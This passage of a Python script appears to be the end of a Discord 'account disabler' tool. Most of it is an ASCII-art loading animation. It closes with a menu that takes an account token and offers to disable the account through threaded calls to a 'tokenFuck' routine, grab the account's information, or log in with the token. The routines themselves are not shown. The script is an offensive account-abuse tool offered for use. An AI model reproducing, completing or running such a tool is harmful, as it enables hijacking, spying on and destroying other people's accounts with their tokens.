    print(f'''{Fore.MAGENTA}
                                                            ██████╗ ██╗███████╗ █████╗ 
                                                            ██╔══██╗██║██╔════╝██╔══██╗
                                                            ██║  ██║██║███████╗███████║
                                                            ██║  ██║██║╚════██║██╔══██║  
                                                            ██████╔╝██║███████║██║  ██║
                                                            ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.19)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disab | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
                                                            ██████╗ ██╗███████╗ █████╗ ██████╗
                                                            ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗
                                                            ██║  ██║██║███████╗███████║██████╔╝
                                                            ██║  ██║██║╚════██║██╔══██║██╔══██╗
                                                            ██████╔╝██║███████║██║  ██║██████╔╝
                                                            ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disabl | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
                                                            ██████╗ ██╗███████╗ █████╗ ██████╗ ██╗  
                                                            ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║    
                                                            ██║  ██║██║███████╗███████║██████╔╝██║    
                                                            ██║  ██║██║╚════██║██╔══██║██╔══██╗██║      
                                                            ██████╔╝██║███████║██║  ██║██████╔╝███████╗
                                                            ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.17)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
                                                            ██████╗ ██╗███████╗ █████╗ ██████╗ ██╗     ███████╗
                                                            ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║     ██╔════╝
                                                            ██║  ██║██║███████╗███████║██████╔╝██║     █████╗  
                                                            ██║  ██║██║╚════██║██╔══██║██╔══██╗██║     ██╔══╝  
                                                            ██████╔╝██║███████║██║  ██║██████╔╝███████╗███████╗
                                                            ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading..")
    print('_' * 108)
    print('')
    print('_' * 108)
    time.sleep(0.16)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.40)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading..")
    print('_' * 108)
    print('')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
                                                            ██████╗ ██╗███████╗ █████╗ ██████╗ ██╗     ███████╗
                                                            ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║     ██╔════╝
                                                            ██║  ██║██║███████╗███████║██████╔╝██║     █████╗  
                                                            ██║  ██║██║╚════██║██╔══██║██╔══██╗██║     ██╔══╝  
                                                            ██████╔╝██║███████║██║  ██║██████╔╝███████╗███████╗
                                                            ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.40)
    clear()

    print('_' * 108)
    print('')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | v1.0 | social#0001")
    print('_' * 108)
    print(f'''
    WELCOME TO:{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗███████╗ █████╗ ██████╗ ██╗     ███████╗
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║     ██╔════╝
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║███████╗███████║██████╔╝██║     █████╗  
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚════██║██╔══██║██╔══██╗██║     ██╔══╝  
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║███████║██║  ██║██████╔╝███████╗███████╗
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝{Fore.RESET}
    CREATED BY {Fore.MAGENTA}SOCIAL.{Fore.RESET}''')
    print('_' * 108)
    time.sleep(4)
    clear()

def getBanner():
    banner = f'''
    ___________________________________________________________________________________________________________
    WELCOME TO:{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗███████╗ █████╗ ██████╗ ██╗     ███████╗
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║     ██╔════╝
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║███████╗███████║██████╔╝██║     █████╗  
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚════██║██╔══██║██╔══██╗██║     ██╔══╝  
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║███████║██║  ██║██████╔╝███████╗███████╗
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝{Fore.RESET}
    CREATED BY {Fore.MAGENTA}SOCIAL.{Fore.RESET}                                                     {Fore.MAGENTA}'TOKEN LOG-IN'{Fore.RESET} REQUIRES CHROMEDRIVER                                                                           
    ___________________________________________________________________________________________________________ 

                [{Fore.MAGENTA}1{Fore.RESET}] DISABLE AN ACCOUNT
                [{Fore.MAGENTA}2{Fore.RESET}] GRAB ACCOUNT INFORMATION
                [{Fore.MAGENTA}3{Fore.RESET}] TOKEN LOG-IN'''
    return banner


def startMenu():
    print(getBanner())
    print(f'[{Fore.MAGENTA}>{Fore.RESET}] DECISION >', end=''); choice = str(input('  :  '))

    if choice == '1':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] TOKEN >', end=''); token = input('  :  ')
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] THREADS >', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '2':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] TOKEN >', end=''); token = input('  :  ')
        tokenInfo(token)
    
    elif choice == '3':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] TOKEN >', end=''); token = input('  :  ')
        tokenLogin(token)

    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()
        
if __name__ == '__main__':
    ddisable()
    startMenu()
